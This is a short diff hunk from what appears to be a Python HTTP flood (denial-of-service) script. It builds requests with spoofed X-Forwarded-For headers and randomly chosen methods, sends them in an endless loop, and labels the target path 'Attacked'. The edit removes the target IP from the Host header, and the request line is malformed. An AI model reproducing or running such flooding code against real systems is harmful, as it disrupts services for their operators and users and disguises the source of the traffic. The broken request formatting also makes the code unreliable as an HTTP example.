@@ -55,7 +55,7 @@ def start2():
   connection3 += "X-Forwarded-For: " + spoofer3() + "\r\n"
   connect = "Connection : keep-Alive\r\n\r\n"
   get_rand = random.choice(['GET','POST',"HEAD"])
-  get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "GET /Attacked-RR/1.1\r\nHost: " + "\r\n"
   request = get_host + connect + connection + get_rand + "\r\n"
   while True:
         try:
